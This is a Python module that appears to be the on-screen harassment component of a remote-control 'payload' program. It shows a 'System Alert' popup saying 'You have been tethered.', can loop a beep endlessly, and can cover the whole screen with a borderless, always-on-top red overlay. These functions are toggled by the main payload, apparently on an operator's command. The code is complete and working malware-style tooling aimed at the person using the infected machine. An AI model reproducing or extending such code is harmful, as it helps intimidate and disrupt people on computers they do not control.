import tkinter as tk
from tkinter import messagebox
import threading
import time
import winsound

# --- Global variables that will be SET by the main payload.py ---
GUI_ROOT = None
OVERLAY_WINDOW = None
NOISE_ACTIVE = False
OVERLAY_ACTIVE = False # Explicitly initialize the state

def init_gui(root):
    """Receives the main Tkinter root window from the payload."""
    global GUI_ROOT
    GUI_ROOT = root

def show_popup(text="You have been tethered."):
    """Schedules a popup to be shown on the main GUI thread."""
    if GUI_ROOT:
        GUI_ROOT.after(0, lambda: messagebox.showinfo("System Alert", text))

def _noise_loop():
    """The actual loop that generates noise."""
    while NOISE_ACTIVE:
        winsound.Beep(500, 200)
        time.sleep(0.5)

def toggle_noise():
    """Starts or stops the annoying noise thread."""
    global NOISE_ACTIVE
    # --- THIS IS THE FIX ---
    # Simple, foolproof boolean flip.
    NOISE_ACTIVE = not NOISE_ACTIVE
    # -----------------------
    
    if NOISE_ACTIVE:
        threading.Thread(target=_noise_loop, daemon=True).start()
    return f"Noise toggled {'ON' if NOISE_ACTIVE else 'OFF'}"

def _create_overlay():
    """Creates the fullscreen, semi-transparent overlay window."""
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True)
    OVERLAY_WINDOW.attributes('-alpha', 0.2)
    OVERLAY_WINDOW.attributes("-topmost", True)
    OVERLAY_WINDOW.configure(bg='red')
    OVERLAY_WINDOW.overrideredirect(True)

def _destroy_overlay():
    """Destroys the overlay window."""
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW:
        OVERLAY_WINDOW.destroy()
        OVERLAY_WINDOW = None

def toggle_screen_overlay():
    """Schedules the overlay to be toggled on the main GUI thread."""
    global OVERLAY_ACTIVE
    # --- THIS IS THE FIX ---
    # Simple, foolproof boolean flip.
    OVERLAY_ACTIVE = not OVERLAY_ACTIVE
    # -----------------------
    
    if GUI_ROOT:
        if OVERLAY_ACTIVE:
            GUI_ROOT.after(0, _create_overlay)
        else:
            GUI_ROOT.after(0, _destroy_overlay)
    return f"Overlay toggled {'ON' if OVERLAY_ACTIVE else 'OFF'}"